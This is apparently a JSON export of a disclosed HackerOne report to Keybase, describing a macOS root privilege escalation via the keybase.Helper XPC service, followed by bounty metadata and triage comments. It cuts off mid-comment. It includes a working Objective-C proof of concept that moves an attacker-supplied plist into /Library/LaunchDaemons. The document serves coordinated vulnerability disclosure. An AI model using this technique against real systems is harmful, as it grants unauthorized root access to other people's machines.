This file is responsible for launching `/Library/PrivilegedHelperTools/keybase.Helper` for the registered mach port keybase.Helper.\n\nIf we take the source code located at https://github.com/keybase/client/blob/master/osx/Helper/KBHelper.m, we can see a number of exposed \"methods\" via an XPC connection, including:\n\n* remove - Ability to remove any file on the filesystem as the root user\n* move - Ability to move any file on the filesystem as the root user\n* createDirectory - Ability to create a directory as the root user, and provide attributes such as the owner UID/GID and permissions\n* addToPath - Add applications to the /usr/local/bin directory\n* kextInstall - Add and start kext \n\nInteracting with the helper via XPC takes place via the MPMessagePack framework, which is available from https://github.com/gabriel/MPMessagePack/blob/master/XPC/MPXPCClient.m.\n\nIf we craft a very simple POC, we can see that it is trivial to place files within dangerous locations:\n\n```\n    NSError *error;\n    MPXPCClient *client = [[MPXPCClient alloc] initWithServiceName:@\"keybase.Helper\" privileged:true];\n    [client connect:\u0026error];\n    \n    // Moves any file from \"source\" to \"destination\" as the root user\n    [client sendRequest:@\"move\" params:@[@{@\"source\":@\"/tmp/src\", @\"destination\":@\"/Library/dst\"}] completion: ^(NSError *error, id value) {\n        NSLog(@\"WORKS\");\n    }];\n ``` \n\nIt does appear than an effort has been made to avoid executing arbitrary applications by the helper, for example, we can see the following comments within the \"\" method:\n\n```\n    // Make sure the passed-in redirector binary points to a proper binary\n    // signed by Keybase, we don't want this to be able to run arbitrary code\n    // as root.\n```\n\nThis doesn't stop us from elevating privileges however, for example, we can simply use the 'move' method to copy any file (or overwrite any file). As a simple example, below we can see a simple operation moving a plist file into /Library/LaunchDaemons/com.xpnsec.test.plist:\n\n```\n    [client sendRequest:@\"move\" params:@[@{@\"source\":@\"/tmp/elevate.plist\", @\"destination\":@\"/Library/LaunchDaemons/com.xpnsec.test.plist\"}] completion: ^(NSError *error, id value) {\n        NSLog(@\"WORKS\");\n    }];\n```\n\nOn reboot, we see that our service is installed and executed as the root user.\n\nAlternatively, we can simply copy our malicious payload using the above method to `/Library/PrivilegedHelperTools/keybase.Helper` and spawn via our XPC call.\n\n## Impact\n\nThe impact would be elevation of privileges from any user with permission to access the keybase.Helper XPC service (which is currently all users) to the root user on macOS.","bounty_amount":"5000.0","formatted_bounty":"$5,000","weakness":{"id":75,"name":"Privilege Escalation"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":null,"vote_count":115,"voters":["m4t35z","mirchr","samengmg","sp1d3rs","cdl","kapytein","heeeeen","michiel","base_64","janmasarik","and 105 more..."],"severity":{"rating":"high","author_type":"Team"},"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"activities":[{"id":3223089,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thanks for the report, we'll investigate ASAP","automated_response":false,"created_at":"2018-08-21T00:08:25.758Z","updated_at":"2018-08-21T00:08:25.758Z","actor":{"username":"maxtaco","cleared":false,"url":"/maxtaco","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"keybase","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":3223298,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"Repro'ed on my laptop","automated_response":false,"created_at":"2018-08-21T02:24:14.260Z","updated_at":"2018-08-21T02:24:14.260Z","actor":{"username":"maxtaco","cleared":false,"url":"/maxtaco","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"keybase","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":3302984,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hey,\n\nJust received a security update for KeyBase on MacOS.
